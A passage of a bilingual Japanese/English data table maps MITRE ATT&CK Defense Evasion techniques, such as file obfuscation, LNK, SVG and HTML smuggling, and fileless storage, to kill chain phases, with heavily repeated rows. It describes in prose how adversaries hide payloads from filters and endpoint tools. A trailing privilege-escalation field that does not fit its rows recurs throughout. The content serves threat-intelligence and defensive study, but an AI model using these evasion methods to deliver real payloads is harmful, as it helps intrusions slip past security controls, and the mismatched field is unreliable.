例えば、攻撃者はパスワードで保護されたWord文書や自己解凍（SFX）アーカイブを悪用して、[フィッシング](https://attack.mitre.org/techniques/T1566)ペイロードなどのファイルを暗号化/エンコードする方法として使用する可能性があります。これらのファイルは通常、ファイルが呼び出されたときに実行される解凍スタブに目的のアーカイブコンテンツを添付することによって機能します（例：[ユーザー実行](https://attack.mitre.org/techniques/T1204)）。(引用: SFX - Encrypted/Encoded File)

攻撃者はまた、ファイル固有のエンコーディングスキームやカスタムエンコーディングスキームを悪用する可能性があります。例えば、テキストファイルのバイトオーダーマーク（BOM）ヘッダーを悪用して、[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)の実行までファイルコンテンツを操作および難読化する可能性があります。","Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as [Software Packing](https://attack.mitre.org/techniques/T1027/002), [Steganography](https://attack.mitre.org/techniques/T1027/003), and [Embedded Payloads](https://attack.mitre.org/techniques/T1027/009), share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)) at the time of execution/use.

This type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files.(Citation: File obfuscation) Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding schemes such as Base64.

The entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.

For example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a [Phishing](https://attack.mitre.org/techniques/T1566) payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation: SFX - Encrypted/Encoded File)

Adversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) execution.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.012,LNKアイコンスマグリング,LNK Icon Smuggling,"攻撃者は、一見無害に見えるWindowsショートカットファイル内に隠すことで、悪意のあるペイロードをダウンロードするコマンドをコンテンツフィルター経由で密輸する可能性があります。Windowsショートカットファイル（.LNK）には、ホストディレクトリ内のLNKファイルに表示されるアイコンファイルへのパスを指定するように設計されたアイコンロケーションフィールド（`IconEnvironmentDataBlock`とも呼ばれる）を含む多くのメタデータフィールドが含まれています。

攻撃者はこのLNKメタデータを悪用して悪意のあるペイロードをダウンロードする可能性があります。例えば、攻撃者はマルウェアを配信するためのフィッシングペイロードとしてLNKファイルを使用していることが確認されています。呼び出されると（例：[悪意のあるファイル](https://attack.mitre.org/techniques/T1204/002)）、LNKアイコンロケーションフィールド内の外部URLを介して参照されるペイロードがダウンロードされる可能性があります。これらのファイルはまた、LNKのターゲットパスフィールド内の[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)/[システムバイナリプロキシ実行](https://attack.mitre.org/techniques/T1218)引数によって呼び出される可能性もあります。(引用: Unprotect Shortcut)(引用: Booby Trap Shortcut 2017)

LNKアイコンスマグリングは、侵害後の悪意のあるスクリプトが感染したホスト上でLNKを実行して追加の悪意のあるペイロードをダウンロードするなど、侵害後にも利用される可能性があります。","Adversaries may smuggle commands to download malicious payloads past content filters by hiding them within otherwise seemingly benign windows shortcut files. Windows shortcut files (.LNK) include many metadata fields, including an icon location field (also known as the `IconEnvironmentDataBlock`) designed to specify the path to an icon file that is to be displayed for the LNK file within a host directory. 

Adversaries may abuse this LNK metadata to download malicious payloads. For example, adversaries have been observed using LNK files as phishing payloads to deliver malware. Once invoked (e.g., [Malicious File](https://attack.mitre.org/techniques/T1204/002)), payloads referenced via external URLs within the LNK icon location field may be downloaded. These files may also then be invoked by [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)/[System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218) arguments within the target path field of the LNK.(Citation: Unprotect Shortcut)(Citation: Booby Trap Shortcut 2017)

LNK Icon Smuggling may also be utilized post compromise, such as malicious scripts executing an LNK on an infected host to download additional malicious payloads.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.017,SVGスマグリング,SVG Smuggling,"攻撃者は、一見無害に見えるSVGファイル内に悪意のあるペイロードを隠すことにより、コンテンツフィルターを通過させてデータやファイルを密輸する可能性があります。(引用: Trustwave SVG Smuggling 2025) SVG（スケーラブルベクターグラフィックス）は、XMLを使用して構築されたベクターベースの画像ファイルです。そのため、正当に`<script>`タグを含めることができ、これにより攻撃者は悪意のあるJavaScriptペイロードを含めることができます。ただし、SVGは画像ファイルとして扱われることが多いため、他の種類の実行可能ファイルよりもユーザーにとって疑わしく見えない可能性があります。

SVGスマグリングにはさまざまな形態があります。例えば、脅威アクターは次のようなコンテンツを含める可能性があります：

* 悪意のあるペイロードの組み立て(引用: Talos SVG Smuggling 2022)
* 悪意のあるペイロードのダウンロード(引用: Cofense SVG Smuggling 2024)
* ユーザーを悪意のあるウェブサイトへリダイレクト(引用: Bleeping Computer SVG Smuggling 2024)
* 偽のログインフォームやダウンロードボタンなど、ユーザーへのインタラクティブなコンテンツの表示(引用: Bleeping Computer SVG Smuggling 2024)

SVGスマグリングは、悪意のあるペイロードを含むSVGがHTMLファイル内に含まれる[HTMLスマグリング](https://attack.mitre.org/techniques/T1027/006)と組み合わせて使用される場合があります。(引用: Talos SVG Smuggling 2022) SVGは、PDFなど他の種類のドキュメントに含まれる場合もあります。","Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files.(Citation: Trustwave SVG Smuggling 2025) SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include `<script>` tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files.

SVG smuggling can take a number of forms. For example, threat actors may include content that: 

* Assembles malicious payloads(Citation: Talos SVG Smuggling 2022)
* Downloads malicious payloads(Citation: Cofense SVG Smuggling 2024)
* Redirects users to malicious websites(Citation: Bleeping Computer SVG Smuggling 2024)
* Displays interactive content to users, such as fake login forms and download buttons.(Citation: Bleeping Computer SVG Smuggling 2024)

SVG Smuggling may be used in conjunction with [HTML Smuggling](https://attack.mitre.org/techniques/T1027/006) where an SVG with a malicious payload is included inside an HTML file.(Citation: Talos SVG Smuggling 2022) SVGs may also be included in other types of documents, such as PDFs.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.006,HTMLスマグリング,HTML Smuggling,"攻撃者は、一見無害に見えるHTMLファイル内に悪意のあるペイロードを隠すことにより、コンテンツフィルターを通過させてデータやファイルを密輸する可能性があります。HTMLドキュメントは、JavaScript Blob（生のバイトを表す不変データ）として知られる大きなバイナリオブジェクトを格納でき、これは後でファイルのようなオブジェクトに構築できます。データはまた、メディアタイプまたはMIMEファイルをHTMLドキュメントにインラインで埋め込むことを可能にするデータURLに格納することもできます。HTML5では、ファイルのダウンロードを開始するために使用できるダウンロード属性も導入されました。(引用: HTML Smuggling Menlo Security 2020)(引用: Outlflank HTML Smuggling 2018)

攻撃者は、JavaScript BlobやHTML5ダウンロード属性を悪用することにより、HTMLスマグリングを通じてセキュリティ制御をバイパスするペイロードを被害者に配信する可能性があります。Webコンテンツフィルターなどのセキュリティ制御は、コンテンツが通常良性のMIMEタイプ（<code>text/plain</code>や<code>text/html</code>など）に基づいている可能性があるため、HTML/JSファイル内の密輸された悪意のあるファイルを識別できない場合があります。悪意のあるファイルやデータは、データURLやJavaScript Blobを介してHTMLファイル内に難読化されて隠蔽され、被害者に到達したときに難読化解除できます（つまり、[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)）。これにより、コンテンツフィルターをバイパスできる可能性があります。

例えば、JavaScript Blobは、被害者のマシンで悪意のあるファイルを動的に生成するために悪用される可能性があり、<code>msSaveBlob</code>などのJavaScript関数を悪用することによってディスクにドロップされる可能性があります。(引用: HTML Smuggling Menlo Security 2020)(引用: MSTIC NOBELIUM May 2021)(引用: Outlflank HTML Smuggling 2018)(引用: nccgroup Smuggling HTA 2017)","Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)

Adversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.

For example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1027,難読化されたファイルまたは情報,Obfuscated Files or Information,"攻撃者は、実行可能ファイルやファイルをシステム上または転送中に暗号化、エンコード、またはその他の方法で難読化することにより、発見や分析を困難にしようとする可能性があります。これは、さまざまなプラットフォームやネットワーク全体で防御を回避するために使用できる一般的な動作です。

ペイロードは、検出を回避するために圧縮、アーカイブ、または暗号化される場合があります。これらのペイロードは、初期アクセス中または後で検出を軽減するために使用される場合があります。場合によっては、[ユーザー実行](https://attack.mitre.org/techniques/T1204)のために[ファイルまたは情報の難読化解除/デコード](https://attack.mitre.org/techniques/T1140)を開くためにユーザーのアクションが必要になることがあります。ユーザーはまた、攻撃者によって提供されたパスワードで保護された圧縮/暗号化ファイルを開くためにパスワードを入力する必要がある場合もあります。(引用: Volexity PowerDuke November 2016) 攻撃者はまた、JavaScriptなどの圧縮またはアーカイブされたスクリプトを使用する場合もあります。

ファイルの一部は、他の方法では防御側が発見するのに役立つ平文文字列を隠すためにエンコードされる場合があります。(引用: Linux/Cdorked.A We Live Security Analysis) ペイロードはまた、再構成された場合にのみ悪意のある機能が明らかになる、一見無害に見える個別のファイルに分割される場合もあります。(引用: Carbon Black Obfuscation Sept 2016)

攻撃者はまた、ペイロードから、または[コマンドおよびスクリプトインタープリタ](https://attack.mitre.org/techniques/T1059)を介して直接実行されるコマンドを難読化するために、[コマンド難読化](https://attack.mitre.org/techniques/T1027/010)を悪用する可能性があります。環境変数、エイリアス、文字、およびその他のプラットフォーム/言語固有のセマンティクスを使用して、署名ベースの検出およびアプリケーション制御メカニズムを回避できます。(引用: FireEye Obfuscation June 2017)(引用: FireEye Revoke-Obfuscation July 2017)(引用: PaloAlto EncodedCommand March 2017)","Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) for [User Execution](https://attack.mitre.org/techniques/T1204). The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. (Citation: Volexity PowerDuke November 2016) Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. (Citation: Linux/Cdorked.A We Live Security Analysis) Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. (Citation: Carbon Black Obfuscation Sept 2016)

Adversaries may also abuse [Command Obfuscation](https://attack.mitre.org/techniques/T1027/010) to obscure commands executed from payloads or directly via [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms. (Citation: FireEye Obfuscation June 2017) (Citation: FireEye Revoke-Obfuscation July 2017)(Citation: PaloAlto EncodedCommand March 2017)",T1027.011,ファイルレスストレージ,Fileless Storage,"攻撃者は、防御から悪意のあるアクティビティを隠蔽するために、「ファイルレス」形式でデータを保存する可能性があります。ファイルレスストレージは、ファイル以外の任意の形式として広く定義できます。Windowsシステムにおける不揮発性ファイルレスストレージの一般的な例としては、Windowsレジストリ、イベントログ、またはWMIリポジトリがあります。(引用: Microsoft Fileless)(引用: SecureList Fileless) Linuxシステムでは、`/dev/shm`、`/run/shm`、`/var/run`、`/var/lock`などの共有メモリディレクトリもファイルレスストレージと見なされる場合があります。これらのディレクトリに書き込まれたファイルはRAMに直接マップされ、ディスクには保存されません。(引用: Elastic Binary Executed from Shared Memory Directory)(引用: Akami Frog4Shell 2024)(引用: Aquasec Muhstik Malware 2024)

[リフレクティブコードローディング](https://attack.mitre.org/techniques/T1620)や[プロセスインジェクション](https://attack.mitre.org/techniques/T1055)のようなファイルレスのメモリ内動作と同様に、ファイルレスデータストレージは、ディスクストレージから特定のファイル形式にしかアクセスできないウイルス対策ソフトやその他のエンドポイントセキュリティツールによって検出されないままになる可能性があります。ファイルレスストレージを利用することで、攻撃者はLinuxの読み取り専用ファイルシステムが提供する保護をバイパスすることも可能になります。(引用: Sysdig Fileless Malware 23022)

攻撃者は、ペイロード/シェルコード（潜在的に[永続性](https://attack.mitre.org/tactics/TA0003)の一部として使用される）や、まだ被害者から持ち出されていない収集済みデータ（例：[ローカルデータステージング](https://attack.mitre.org/techniques/T1074/001)）など、さまざまな種類の保存データを隠蔽するためにファイルレスストレージを使用する場合があります。攻撃者はまた、保存時にこのファイルレスデータを暗号化、エンコード、分割、またはその他の方法で難読化することがよくあります。

ファイルレスストレージアクティビティの一部の形式は、ファイルシステムに間接的にアーティファクトを作成する可能性がありますが、WMI（例：`%SystemRoot%\\System32\\Wbem\\Repository`）やレジストリ（例：`%SystemRoot%\\System32\\Config`）の物理ファイルなど、中央の、または他の方法では検査が困難な形式で作成します。(引用: Microsoft Fileless)","Adversaries may store data in \""fileless\"" formats to conceal malicious activity from defenses. Fileless storage can be broadly defined as any format other than a file. Common examples of non-volatile fileless storage in Windows systems include the Windows Registry, event logs, or WMI repository.(Citation: Microsoft Fileless)(Citation: SecureList Fileless) In Linux systems, shared memory directories such as `/dev/shm`, `/run/shm`, `/var/run`, and `/var/lock` may also be considered fileless storage, as files written to these directories are mapped directly to RAM and not stored on the disk.(Citation: Elastic Binary Executed from Shared Memory Directory)(Citation: Akami Frog4Shell 2024)(Citation: Aquasec Muhstik Malware 2024)

Similar to fileless in-memory behaviors such as [Reflective Code Loading](https://attack.mitre.org/techniques/T1620) and [Process Injection](https://attack.mitre.org/techniques/T1055), fileless data storage may remain undetected by anti-virus and other endpoint security tools that can only access specific file formats from disk storage. Leveraging fileless storage may also allow adversaries to bypass the protections offered by read-only file systems in Linux.(Citation: Sysdig Fileless Malware 23022)

Adversaries may use fileless storage to conceal various types of stored data, including payloads/shellcode (potentially being used as part of [Persistence](https://attack.mitre.org/tactics/TA0003)) and collected data not yet exfiltrated from the victim (e.g., [Local Data Staging](https://attack.mitre.org/techniques/T1074/001)). Adversaries also often encrypt, encode, splice, or otherwise obfuscate this fileless data when stored.

